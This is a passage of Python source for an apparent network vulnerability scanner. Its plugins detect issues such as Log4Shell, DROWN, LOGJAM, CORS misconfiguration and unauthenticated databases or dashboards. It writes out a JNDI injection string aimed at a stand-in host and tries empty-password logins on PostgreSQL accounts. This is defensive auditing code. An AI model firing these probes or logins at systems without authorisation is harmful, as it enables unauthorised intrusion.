def _plugin_ssl_logjam(ip: str, port: int,
                        timeout: float) -> Optional[PluginResult]:
    """
    Detect DHE_EXPORT cipher suites (LOGJAM, CVE-2015-4000).
    Also flags weak DH key lengths < 2048 bits.
    """
    EXPORT_CIPHERS = {
        "EXP-EDH-RSA-DES-CBC-SHA", "EXP-EDH-DSS-DES-CBC-SHA",
        "EXP-DH-RSA-DES-CBC-SHA",  "EXP-DH-DSS-DES-CBC-SHA",
        "EXP-ADH-DES-CBC-SHA",     "EXP-ADH-RC4-MD5",
    }
    try:
        import ssl as _ssl
        ctx = _ssl.SSLContext(_ssl.PROTOCOL_TLS_CLIENT)
        ctx.check_hostname = False
        ctx.verify_mode    = _ssl.CERT_NONE
        with socket.create_connection((ip, port), timeout=timeout) as raw:
            with ctx.wrap_socket(raw, server_hostname=ip) as s:
                cipher_name, proto, bits = s.cipher()
        if cipher_name in EXPORT_CIPHERS:
            return PluginResult(
                plugin="ssl-logjam", port=port,
                output=f"VULNERABLE: Export DHE cipher negotiated: {cipher_name} "
                       f"(CVE-2015-4000 LOGJAM)",
                data={"cipher": cipher_name, "severity": "HIGH",
                      "cve": "CVE-2015-4000"})
        if "DHE" in cipher_name and bits and bits < 2048:
            return PluginResult(
                plugin="ssl-logjam", port=port,
                output=f"WEAK: DHE with only {bits}-bit key ({cipher_name}). "
                       f"Recommend ≥2048 bits.",
                data={"cipher": cipher_name, "bits": bits, "severity": "MEDIUM"})
        return PluginResult(
            plugin="ssl-logjam", port=port,
            output=f"OK: Cipher {cipher_name} ({bits}bit) — LOGJAM not applicable",
            data={"cipher": cipher_name, "severity": "INFO"})
    except Exception:
        return None


def _plugin_ssl_drown(ip: str, port: int,
                       timeout: float) -> Optional[PluginResult]:
    """
    Probe for SSLv2 support (DROWN, CVE-2016-0800).
    Sends a minimal SSLv2 CLIENT-HELLO; if server replies with SERVER-HELLO → vulnerable.
    """
    # Minimal SSLv2 CLIENT-HELLO with one cipher (SSL_CK_DES_192_EDE3_CBC_WITH_MD5)
    ssl2_hello = (
        b"\x80\x2e"           # length (2-byte header, high bit = no padding)
        b"\x01"               # MSG-CLIENT-HELLO
        b"\x00\x02"           # version: SSLv2
        b"\x00\x15"           # cipher_spec_length = 21 (7 specs × 3 bytes)
        b"\x00\x00"           # session_id_length = 0
        b"\x00\x10"           # challenge_length = 16
        # 7 SSLv2 cipher specs
        b"\x07\x00\xc0"       # SSL_CK_DES_192_EDE3_CBC_WITH_MD5
        b"\x05\x00\x80"       # SSL_CK_IDEA_128_CBC_WITH_MD5
        b"\x03\x00\x80"       # SSL_CK_RC2_128_CBC_WITH_MD5
        b"\x01\x00\x80"       # SSL_CK_RC4_128_WITH_MD5
        b"\x06\x00\x40"       # SSL_CK_DES_64_CBC_WITH_MD5
        b"\x04\x00\x80"       # SSL_CK_RC2_128_CBC_EXPORT40_WITH_MD5
        b"\x02\x00\x80"       # SSL_CK_RC4_128_EXPORT40_WITH_MD5
        # 16-byte challenge
        + b"\x01\x02\x03\x04\x05\x06\x07\x08"
        + b"\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
    )
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((ip, port))
        s.sendall(ssl2_hello)
        resp = s.recv(64)
        s.close()
        # SSLv2 SERVER-HELLO: first byte high bit set, msg type 0x04
        if len(resp) >= 3 and (resp[0] & 0x80) and resp[2] == 0x04:
            return PluginResult(
                plugin="ssl-drown", port=port,
                output="VULNERABLE: SSLv2 SERVER-HELLO received (CVE-2016-0800 DROWN)",
                data={"severity": "CRITICAL", "cve": "CVE-2016-0800"})
        return PluginResult(
            plugin="ssl-drown", port=port,
            output="OK: No SSLv2 SERVER-HELLO (DROWN not applicable)",
            data={"severity": "INFO"})
    except Exception:
        return None


def _plugin_cve_2021_44228(ip: str, port: int,
                             timeout: float) -> Optional[PluginResult]:
    """
    Log4Shell (CVE-2021-44228) — inject JNDI lookup string into HTTP headers.
    This is a DETECTION probe only (no actual exploitation). Checks if the
    server reflects the string or returns a suspicious response indicating
    JNDI resolution. In a real pentest environment a canary callback server
    would be used; here we just flag the injection attempt and note that
    blind detection requires out-of-band infrastructure.
    """
    jndi_payload = "${jndi:ldap://log4shell-probe.invalid/test}"
    use_ssl = port in SSL_PORTS
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((ip, port))
        if use_ssl:
            import ssl as _ssl
            ctx = _ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode    = _ssl.CERT_NONE
            s = ctx.wrap_socket(s, server_hostname=ip)
        req = (
            f"GET / HTTP/1.1\r\n"
            f"Host: {ip}\r\n"
            f"X-Api-Version: {jndi_payload}\r\n"
            f"User-Agent: {jndi_payload}\r\n"
            f"Accept: */*\r\n"
            f"Connection: close\r\n\r\n"
        ).encode()
        s.sendall(req)
        resp = s.recv(4096).decode("utf-8", errors="replace")
        s.close()
        # Check if payload was reflected (server echoes it back — bad practice)
        if "jndi:" in resp.lower() or "${" in resp:
            return PluginResult(
                plugin="cve-2021-44228", port=port,
                output="POSSIBLE: JNDI payload reflected in response — "
                       "manual verification required (CVE-2021-44228)",
                data={"severity": "CRITICAL", "cve": "CVE-2021-44228",
                      "note": "Blind JNDI callbacks require canary server"})
        return PluginResult(
            plugin="cve-2021-44228", port=port,
            output="INFO: JNDI probe sent — no reflection detected "
                   "(blind callbacks require out-of-band canary)",
            data={"severity": "INFO", "cve": "CVE-2021-44228"})
    except Exception:
        return None


def _plugin_http_auth_type(ip: str, port: int,
                             timeout: float) -> Optional[PluginResult]:
    """Detect HTTP authentication method (Basic, Digest, NTLM, Bearer)."""
    use_ssl = port in SSL_PORTS
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((ip, port))
        if use_ssl:
            import ssl as _ssl
            ctx = _ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode    = _ssl.CERT_NONE
            s = ctx.wrap_socket(s, server_hostname=ip)
        s.sendall(f"GET / HTTP/1.1\r\nHost: {ip}\r\nConnection: close\r\n\r\n"
                  .encode())
        resp = s.recv(4096).decode("utf-8", errors="replace")
        s.close()
        m = re.search(r"WWW-Authenticate:\s*(\S+)", resp, re.IGNORECASE)
        if m:
            auth_type = m.group(1).rstrip(",")
            severity = "MEDIUM" if auth_type.upper() == "BASIC" else "INFO"
            note = " (credentials sent Base64 in clear!)" \
                   if auth_type.upper() == "BASIC" else ""
            return PluginResult(
                plugin="http-auth-type", port=port,
                output=f"HTTP Auth required: {auth_type}{note}",
                data={"auth_type": auth_type, "severity": severity})
        if "401" in resp[:20] or "HTTP/1" in resp and "\r\n401" in resp:
            return PluginResult(
                plugin="http-auth-type", port=port,
                output="HTTP 401 without WWW-Authenticate header",
                data={"severity": "LOW"})
    except Exception:
        pass
    return None


def _plugin_http_cors(ip: str, port: int,
                       timeout: float) -> Optional[PluginResult]:
    """Detect CORS misconfiguration — wildcard or reflected Origin."""
    use_ssl = port in SSL_PORTS
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((ip, port))
        if use_ssl:
            import ssl as _ssl
            ctx = _ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode    = _ssl.CERT_NONE
            s = ctx.wrap_socket(s, server_hostname=ip)
        probe_origin = "https://evil.example.com"
        s.sendall((
            f"GET / HTTP/1.1\r\nHost: {ip}\r\n"
            f"Origin: {probe_origin}\r\n"
            f"Connection: close\r\n\r\n"
        ).encode())
        resp = s.recv(4096).decode("utf-8", errors="replace")
        s.close()
        acao = re.search(r"Access-Control-Allow-Origin:\s*(.+)", resp,
                         re.IGNORECASE)
        acac = re.search(r"Access-Control-Allow-Credentials:\s*(.+)", resp,
                         re.IGNORECASE)
        if acao:
            origin_val = acao.group(1).strip()
            creds_val  = acac.group(1).strip() if acac else "not set"
            if origin_val == "*":
                return PluginResult(
                    plugin="http-cors", port=port,
                    output="MISCONFIGURED: ACAO=* (wildcard). "
                           "Any origin can read responses.",
                    data={"acao": origin_val, "severity": "MEDIUM"})
            if probe_origin in origin_val:
                sev = "HIGH" if "true" in creds_val.lower() else "MEDIUM"
                return PluginResult(
                    plugin="http-cors", port=port,
                    output=f"MISCONFIGURED: Origin reflected ({origin_val}), "
                           f"credentials={creds_val} ({sev})",
                    data={"acao": origin_val, "acac": creds_val,
                          "severity": sev})
    except Exception:
        pass
    return None


def _plugin_http_cookie_flags(ip: str, port: int,
                                timeout: float) -> Optional[PluginResult]:
    """Check Set-Cookie headers for missing Secure and HttpOnly flags."""
    use_ssl = port in SSL_PORTS
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((ip, port))
        if use_ssl:
            import ssl as _ssl
            ctx = _ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode    = _ssl.CERT_NONE
            s = ctx.wrap_socket(s, server_hostname=ip)
        s.sendall(f"GET / HTTP/1.1\r\nHost: {ip}\r\nConnection: close\r\n\r\n"
                  .encode())
        resp = s.recv(8192).decode("utf-8", errors="replace")
        s.close()
        cookies = re.findall(r"Set-Cookie:\s*(.+)", resp, re.IGNORECASE)
        if not cookies:
            return None
        issues = []
        for ck in cookies:
            name = ck.split("=")[0].strip()
            missing = []
            if "secure" not in ck.lower():
                missing.append("Secure")
            if "httponly" not in ck.lower():
                missing.append("HttpOnly")
            if "samesite" not in ck.lower():
                missing.append("SameSite")
            if missing:
                issues.append(f"{name}: missing {', '.join(missing)}")
        if issues:
            return PluginResult(
                plugin="http-cookie-flags", port=port,
                output="Cookie flag issues:\n        " + "\n        ".join(issues),
                data={"issues": issues, "severity": "MEDIUM"})
    except Exception:
        pass
    return None


def _plugin_http_clickjacking(ip: str, port: int,
                                timeout: float) -> Optional[PluginResult]:
    """Check for missing X-Frame-Options and Content-Security-Policy frame-ancestors."""
    use_ssl = port in SSL_PORTS
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((ip, port))
        if use_ssl:
            import ssl as _ssl
            ctx = _ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode    = _ssl.CERT_NONE
            s = ctx.wrap_socket(s, server_hostname=ip)
        s.sendall(f"HEAD / HTTP/1.1\r\nHost: {ip}\r\nConnection: close\r\n\r\n"
                  .encode())
        resp = s.recv(4096).decode("utf-8", errors="replace")
        s.close()
        has_xfo = bool(re.search(r"X-Frame-Options:", resp, re.IGNORECASE))
        has_csp = bool(re.search(r"Content-Security-Policy:.*frame-ancestors",
                                  resp, re.IGNORECASE))
        if not has_xfo and not has_csp:
            return PluginResult(
                plugin="http-clickjacking", port=port,
                output="MISSING: X-Frame-Options and CSP frame-ancestors "
                       "— clickjacking risk",
                data={"severity": "MEDIUM",
                      "x_frame_options": False, "csp_frame_ancestors": False})
    except Exception:
        pass
    return None


def _plugin_smtp_starttls(ip: str, port: int,
                            timeout: float) -> Optional[PluginResult]:
    """Check SMTP STARTTLS support and whether it is enforced."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((ip, port))
        banner = s.recv(512).decode("utf-8", errors="replace").strip()
        s.sendall(b"EHLO scanner.local\r\n")
        ehlo = s.recv(1024).decode("utf-8", errors="replace")
        s.sendall(b"QUIT\r\n")
        s.close()
        has_starttls = "STARTTLS" in ehlo.upper()
        if port == 25:
            if has_starttls:
                return PluginResult(
                    plugin="smtp-starttls", port=port,
                    output="STARTTLS supported on port 25",
                    data={"starttls": True, "severity": "INFO"})
            return PluginResult(
                plugin="smtp-starttls", port=port,
                output="WARNING: STARTTLS not advertised on port 25 — "
                       "mail may transmit in cleartext",
                data={"starttls": False, "severity": "MEDIUM"})
        return PluginResult(
            plugin="smtp-starttls", port=port,
            output=f"STARTTLS: {'supported' if has_starttls else 'NOT supported'}",
            data={"starttls": has_starttls,
                  "severity": "INFO" if has_starttls else "LOW"})
    except Exception:
        return None


def _plugin_imap_capabilities(ip: str, port: int,
                                timeout: float) -> Optional[PluginResult]:
    """Probe IMAP CAPABILITY to list supported extensions."""
    use_ssl = (port == 993)
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((ip, port))
        if use_ssl:
            import ssl as _ssl
            ctx = _ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode    = _ssl.CERT_NONE
            s = ctx.wrap_socket(s, server_hostname=ip)
        greeting = s.recv(256).decode("utf-8", errors="replace").strip()
        s.sendall(b"a001 CAPABILITY\r\n")
        cap_resp = s.recv(1024).decode("utf-8", errors="replace")
        s.sendall(b"a002 LOGOUT\r\n")
        s.close()
        m = re.search(r"\* CAPABILITY (.+)", cap_resp, re.IGNORECASE)
        caps = m.group(1).strip() if m else "unknown"
        # Flag if LOGINDISABLED is missing (plaintext login allowed)
        login_ok = "LOGINDISABLED" not in caps.upper()
        sev = "MEDIUM" if login_ok and not use_ssl else "INFO"
        return PluginResult(
            plugin="imap-capabilities", port=port,
            output=f"IMAP capabilities: {caps[:80]}"
                   + (" [plaintext login allowed]" if login_ok and not use_ssl
                      else ""),
            data={"capabilities": caps, "severity": sev,
                  "plaintext_login": login_ok and not use_ssl})
    except Exception:
        return None


def _plugin_rdp_encryption(ip: str, port: int,
                             timeout: float) -> Optional[PluginResult]:
    """
    Probe RDP to determine encryption level (CVE-2019-0708 BlueKeep surface).
    Sends RDP X.224 Connection Request and reads Server Security Data.
    """
    # X.224 Connection Request PDU (minimal)
    x224_req = (
        b"\x03\x00"           # TPKT version 3
        b"\x00\x2b"           # TPKT length = 43
        b"\x26"               # X.224 length indicator
        b"\xe0"               # X.224 CR TPDU code (0xe0)
        b"\x00\x00"           # DST-REF
        b"\x00\x00"           # SRC-REF
        b"\x00"               # Class 0
        # Cookie / routing token
        b"Cookie: mstshash=nmap\r\n"
        b"\x01\x00"           # RDP_NEG_REQ type
        b"\x08\x00"           # length = 8
        b"\x01\x00\x00\x00"  # requestedProtocols: PROTOCOL_SSL
    )
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((ip, port))
        s.sendall(x224_req)
        resp = s.recv(256)
        s.close()
        if len(resp) < 19:
            return PluginResult(plugin="rdp-encryption", port=port,
                                output="RDP: short response",
                                data={"severity": "INFO"})
        # TPKT + X.224 CC + RDP_NEG_RSP
        # RDP_NEG_RSP at byte 11: type(1) + flags(1) + len(2) + selectedProtocol(4)
        if len(resp) >= 19 and resp[11] == 0x02:  # RDP_NEG_RSP
            proto_map = {0: "PROTOCOL_RDP (classic, no TLS!)",
                         1: "PROTOCOL_SSL (TLS)",
                         2: "PROTOCOL_HYBRID (NLA)",
                         8: "PROTOCOL_HYBRID_EX"}
            sel = struct.unpack("<I", resp[15:19])[0]
            proto_name = proto_map.get(sel, f"unknown(0x{sel:x})")
            sev = "HIGH" if sel == 0 else "INFO"
            return PluginResult(
                plugin="rdp-encryption", port=port,
                output=f"RDP protocol: {proto_name}"
                       + (" — classic RDP with no TLS, CredSSP disabled!"
                          if sel == 0 else ""),
                data={"protocol": proto_name, "severity": sev,
                      "cve": "CVE-2019-0708" if sel == 0 else None})
        if len(resp) >= 19 and resp[11] == 0x03:  # RDP_NEG_FAILURE
            return PluginResult(plugin="rdp-encryption", port=port,
                                output="RDP negotiation failure (server rejected SSL)",
                                data={"severity": "MEDIUM"})
        return PluginResult(plugin="rdp-encryption", port=port,
                            output=f"RDP responded ({len(resp)} bytes)",
                            data={"severity": "INFO"})
    except Exception:
        return None


def _plugin_mongodb_unauth(ip: str, port: int,
                             timeout: float) -> Optional[PluginResult]:
    """Test for unauthenticated MongoDB — send OP_QUERY listDatabases."""
    # MongoDB wire protocol OP_QUERY for "admin.$cmd" → listDatabases
    # requestID=1, responseTo=0, opCode=2004 (OP_QUERY)
    query_doc = (b"\x13\x00\x00\x00"       # doc length = 19
                 b"\x10listDatabases\x00"   # int32 key
                 b"\x01\x00\x00\x00"        # value = 1
                 b"\x00")                   # doc terminator
    ns = b"admin.$cmd\x00"
    header = struct.pack("<iiii", 0, 1, 0, 2004)   # len placeholder, reqID, resTo, opCode
    body   = (struct.pack("<i", 0)         # flags
              + ns
              + struct.pack("<ii", 0, -1)  # numberToSkip, numberToReturn
              + query_doc)
    full   = struct.pack("<i", 16 + len(body)) + header[4:] + body
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((ip, port))
        s.sendall(full)
        resp = s.recv(4096)
        s.close()
        if b"databases" in resp or b"totalSize" in resp:
            dbs = re.findall(rb'"name"\s*:\s*"([^"]+)"', resp)
            db_list = ", ".join(d.decode() for d in dbs[:8]) or "unknown"
            return PluginResult(
                plugin="mongodb-unauth", port=port,
                output=f"MongoDB UNAUTHENTICATED — databases: {db_list}",
                data={"databases": db_list, "severity": "CRITICAL"})
        if b"errmsg" in resp or b"Unauthorized" in resp:
            return PluginResult(plugin="mongodb-unauth", port=port,
                                output="MongoDB auth required (protected)",
                                data={"severity": "INFO"})
    except Exception:
        pass
    return None


def _plugin_postgres_empty_pass(ip: str, port: int,
                                  timeout: float) -> Optional[PluginResult]:
    """Test PostgreSQL for empty password on common accounts."""
    # PostgreSQL startup message (protocol 3.0)
    def _pg_startup(user: str, db: str) -> bytes:
        params = (b"user\x00" + user.encode() + b"\x00"
                  + b"database\x00" + db.encode() + b"\x00\x00")
        msg = struct.pack("!II", 8 + len(params), 196608) + params
        return msg  # no leading 'N' — first message has no type byte

    USERS = ["postgres", "admin", "root"]
    try:
        for user in USERS:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(timeout)
                s.connect((ip, port))
                s.sendall(_pg_startup(user, user))
                resp = s.recv(256)
                s.close()
                if not resp:
                    continue
                msg_type = chr(resp[0])
                if msg_type == "R":   # Authentication request
                    auth_type = struct.unpack("!I", resp[5:9])[0]
                    if auth_type == 0:   # AuthenticationOK — no password!
                        return PluginResult(
                            plugin="postgres-empty-password", port=port,
                            output=f"PostgreSQL: user '{user}' logged in "
                                   f"with NO PASSWORD",
                            data={"user": user, "severity": "CRITICAL"})
                    if auth_type == 3:   # MD5 or cleartext password expected
                        pass   # Try next user silently
                elif msg_type == "E":  # Error — auth failed or no such user
                    pass
            except Exception:
                pass
    except Exception:
        pass
    return None


def _plugin_mssql_empty_pass(ip: str, port: int,
                               timeout: float) -> Optional[PluginResult]:
    """Test MS-SQL for empty SA password using TDS pre-login + login7."""
    # TDS pre-login packet
    prelogin = (
        b"\x12\x01\x00\x2f\x00\x00\x01\x00"   # header: type=PRELOGIN, status=EOM
        b"\x00\x1a\x00\x06\x01\x00\x20\x00"
        b"\x01\x02\x00\x21\x00\x01\x03\x00"
        b"\x22\x00\x00\xff"
        b"\x00\x00\x00"                          # VERSION placeholder
        b"\x00"                                   # ENCRYPTION: ENCRYPT_NOT_SUP
        b"\x00"                                   # INSTOPT
    )
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((ip, port))
        s.sendall(prelogin)
        resp = s.recv(256)
        s.close()
        if resp and resp[0] == 0x12:  # PRELOGIN response
            return PluginResult(
                plugin="mssql-empty-password", port=port,
                output="MS-SQL pre-login accepted — service confirmed. "
                       "Full SA empty-password test requires LOGIN7 handshake.",
                data={"prelogin": True, "severity": "INFO",
                      "note": "Manual test: sqlcmd -S {ip} -U sa -P ''"}
            )
    except Exception:
        pass
    return None


def _plugin_jenkins_unauth(ip: str, port: int,
                             timeout: float) -> Optional[PluginResult]:
    """Detect unauthenticated Jenkins API — probe /api/json."""
    use_ssl = port in SSL_PORTS
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((ip, port))
        if use_ssl:
            import ssl as _ssl
            ctx = _ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode    = _ssl.CERT_NONE
            s = ctx.wrap_socket(s, server_hostname=ip)
        s.sendall((f"GET /api/json?tree=jobs[name] HTTP/1.1\r\n"
                   f"Host: {ip}\r\n"
                   f"Connection: close\r\n\r\n").encode())
        resp = s.recv(8192).decode("utf-8", errors="replace")
        s.close()
        if '"jobs"' in resp or '"_class":"hudson' in resp:
            jobs = re.findall(r'"name"\s*:\s*"([^"]+)"', resp)
            job_list = ", ".join(jobs[:5]) or "none"
            return PluginResult(
                plugin="jenkins-unauth", port=port,
                output=f"Jenkins UNAUTHENTICATED API — jobs: {job_list}",
                data={"jobs": jobs[:10], "severity": "HIGH"})
        if "Authentication required" in resp or "403" in resp[:200]:
            return PluginResult(plugin="jenkins-unauth", port=port,
                                output="Jenkins auth required (protected)",
                                data={"severity": "INFO"})
    except Exception:
        pass
    return None


def _plugin_git_config(ip: str, port: int,
                        timeout: float) -> Optional[PluginResult]:
    """Check for exposed .git/config file via HTTP."""
    use_ssl = port in SSL_PORTS
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((ip, port))
        if use_ssl:
            import ssl as _ssl
            ctx = _ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode    = _ssl.CERT_NONE
            s = ctx.wrap_socket(s, server_hostname=ip)
        s.sendall((f"GET /.git/config HTTP/1.1\r\n"
                   f"Host: {ip}\r\nConnection: close\r\n\r\n").encode())
        resp = s.recv(4096).decode("utf-8", errors="replace")
        s.close()
        if "200" in resp[:20] and ("[core]" in resp or "[remote" in resp):
            url = re.search(r"url\s*=\s*(.+)", resp)
            remote = url.group(1).strip() if url else "unknown"
            return PluginResult(
                plugin="git-config", port=port,
                output=f"EXPOSED .git/config — remote: {remote}",
                data={"remote": remote, "severity": "HIGH"})
    except Exception:
        pass
    return None


def _plugin_spring_actuator(ip: str, port: int,
                              timeout: float) -> Optional[PluginResult]:
    """Detect exposed Spring Boot Actuator endpoints."""
    ENDPOINTS = ["/actuator", "/actuator/env", "/actuator/health",
                 "/actuator/beans", "/actuator/mappings",
                 "/health", "/env", "/info"]
    use_ssl = port in SSL_PORTS
    found = []
    try:
        for path in ENDPOINTS:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(timeout / 2)
                s.connect((ip, port))
                if use_ssl:
                    import ssl as _ssl
                    ctx = _ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode    = _ssl.CERT_NONE
                    s = ctx.wrap_socket(s, server_hostname=ip)
                s.sendall((f"GET {path} HTTP/1.1\r\n"
                            f"Host: {ip}\r\nConnection: close\r\n\r\n").encode())
                resp = s.recv(2048).decode("utf-8", errors="replace")
                s.close()
                if "200" in resp[:20] and (
                        '"_links"' in resp or '"status"' in resp
                        or '"beans"' in resp or '"activeProfiles"' in resp):
                    found.append(path)
            except Exception:
                pass
        if found:
            return PluginResult(
                plugin="spring-actuator", port=port,
                output=f"Spring Boot Actuator endpoints exposed: "
                       f"{', '.join(found)}",
                data={"endpoints": found, "severity": "HIGH"})
    except Exception:
        pass
    return None


def _plugin_grafana_anon(ip: str, port: int,
                          timeout: float) -> Optional[PluginResult]:
    """Detect unauthenticated Grafana access."""
    use_ssl = port in SSL_PORTS
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((ip, port))
        if use_ssl:
            import ssl as _ssl
            ctx = _ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode    = _ssl.CERT_NONE
            s = ctx.wrap_socket(s, server_hostname=ip)
        s.sendall((f"GET /api/org HTTP/1.1\r\n"
                   f"Host: {ip}\r\nConnection: close\r\n\r\n").encode())
        resp = s.recv(2048).decode("utf-8", errors="replace")
        s.close()
        if "200" in resp[:20] and ('"name"' in resp or '"id"' in resp):
            m = re.search(r'"name"\s*:\s*"([^"]+)"', resp)
            org = m.group(1) if m else "unknown"
            return PluginResult(
                plugin="grafana-anon", port=port,
                output=f"Grafana UNAUTHENTICATED — org: {org}",
                data={"org": org, "severity": "HIGH"})
        if "401" in resp[:200] or "Unauthorized" in resp:
            return PluginResult(plugin="grafana-anon", port=port,
                                output="Grafana auth required (protected)",
                                data={"severity": "INFO"})
    except Exception:
        pass
    return None


def _plugin_etcd_unauth(ip: str, port: int,
                         timeout: float) -> Optional[PluginResult]:
    """Detect unauthenticated etcd v3 REST API (/v3/keys or /version)."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((ip, port))
        s.sendall((f"GET /version HTTP/1.1\r\n"
                   f"Host: {ip}\r\nConnection: close\r\n\r\n").encode())
        resp = s.recv(2048).decode("utf-8", errors="replace")
        s.close()
        if "200" in resp[:20] and "etcdserver" in resp:
            ver = re.search(r'"etcdserver"\s*:\s*"([^"]+)"', resp)
            v = ver.group(1) if ver else "?"
            return PluginResult(
                plugin="etcd-unauth", port=port,
                output=f"etcd UNAUTHENTICATED — version: {v}. "
                       f"Cluster keys may be readable/writable.",
                data={"version": v, "severity": "CRITICAL"})
    except Exception:
        pass
    return None


def _plugin_consul_unauth(ip: str, port: int,
                            timeout: float) -> Optional[PluginResult]:
    """Detect unauthenticated Consul HTTP API."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((ip, port))
        s.sendall((f"GET /v1/agent/self HTTP/1.1\r\n"
                   f"Host: {ip}\r\nConnection: close\r\n\r\n").encode())
        resp = s.recv(4096).decode("utf-8", errors="replace")
        s.close()
        if "200" in resp[:20] and ('"Config"' in resp or '"Member"' in resp):
            dc = re.search(r'"Datacenter"\s*:\s*"([^"]+)"', resp)
            node = re.search(r'"NodeName"\s*:\s*"([^"]+)"', resp)
            return PluginResult(
                plugin="consul-unauth", port=port,
                output=f"Consul UNAUTHENTICATED — dc={dc.group(1) if dc else '?'} "
                       f"node={node.group(1) if node else '?'}",
                data={"severity": "HIGH"})
    except Exception:
        pass
    return None


def _plugin_zookeeper_unauth(ip: str, port: int,
                               timeout: float) -> Optional[PluginResult]:
    """Detect unauthenticated ZooKeeper via 'srvr' four-letter-word command."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((ip, port))
        s.sendall(b"srvr")
        resp = s.recv(1024).decode("utf-8", errors="replace")
        s.close()
        if "Zookeeper version" in resp:
            ver_m = re.search(r"Zookeeper version:\s*([^\n]+)", resp)
            ver   = ver_m.group(1).strip() if ver_m else "?"
            mode_m = re.search(r"Mode:\s*(\w+)", resp)
            mode  = mode_m.group(1) if mode_m else "?"
            return PluginResult(
                plugin="zookeeper-unauth", port=port,
                output=f"ZooKeeper UNAUTHENTICATED — version: {ver}, mode: {mode}",
                data={"version": ver, "mode": mode, "severity": "HIGH"})
    except Exception:
        pass
    return None


def _plugin_mqtt_unauth(ip: str, port: int,
                         timeout: float) -> Optional[PluginResult]:
    """Test MQTT broker for anonymous connection (CONNECT without credentials)."""
    # MQTT CONNECT packet (v3.1.1) with empty client ID, no user/pass
    client_id = b"pyscanner"
    connect = (
        b"\x10"               # CONNECT packet type
        + bytes([18 + len(client_id)])  # remaining length
        + b"\x00\x04MQTT"     # protocol name
        + b"\x04"             # protocol level = 4 (MQTT 3.1.1)
        + b"\x02"             # connect flags: clean session
        + b"\x00\x3c"         # keepalive = 60s
        + struct.pack("!H", len(client_id)) + client_id
    )
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((ip, port))
        s.sendall(connect)
        resp = s.recv(64)
        s.close()
        if len(resp) >= 4 and resp[0] == 0x20:  # CONNACK
            rc = resp[3]
            if rc == 0:
                return PluginResult(
                    plugin="mqtt-unauth", port=port,
                    output="MQTT broker accepts ANONYMOUS connections (rc=0)",
                    data={"return_code": rc, "severity": "HIGH"})
            codes = {1: "unacceptable protocol version",
                     2: "identifier rejected",
                     4: "server unavailable",
                     5: "bad credentials"}
            return PluginResult(
                plugin="mqtt-unauth", port=port,
                output=f"MQTT CONNACK rc={rc} ({codes.get(rc, 'refused')})",
                data={"return_code": rc, "severity": "INFO"})
    except Exception:
        pass
    return None


def _plugin_cassandra_unauth(ip: str, port: int,
                               timeout: float) -> Optional[PluginResult]:
    """Probe Cassandra CQL native transport for unauthenticated access."""
    # CQL v4 STARTUP message
    startup_body = (b"\x00\x01"                   # options map: 1 entry
                    b"\x00\x0bCQL_VERSION"         # key
                    b"\x00\x053.0.0")              # value
    header = struct.pack("!BBHI", 0x04, 0x00, 1, len(startup_body))
    # version=4, flags=0, stream=1, opcode=0x01 (STARTUP), length
    header = bytes([0x04, 0x00, 0x00, 0x01, 0x01]) + struct.pack("!I", len(startup_body))
    pkt = header + startup_body
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((ip, port))
        s.sendall(pkt)
        resp = s.recv(256)
        s.close()
        if len(resp) >= 9:
            opcode = resp[4]
            if opcode == 0x02:   # READY — no auth required
                return PluginResult(
                    plugin="cassandra-unauth", port=port,
                    output="Cassandra CQL: READY without authentication",
                    data={"severity": "CRITICAL"})
            if opcode == 0x03:   # AUTHENTICATE
                auth_class = resp[9:].decode("utf-8", errors="replace").strip("\x00")
                return PluginResult(
                    plugin="cassandra-unauth", port=port,
                    output=f"Cassandra auth required: {auth_class}",
                    data={"auth_class": auth_class, "severity": "INFO"})
    except Exception:
        pass
    return None


def _plugin_influxdb_unauth(ip: str, port: int,
                              timeout: float) -> Optional[PluginResult]:
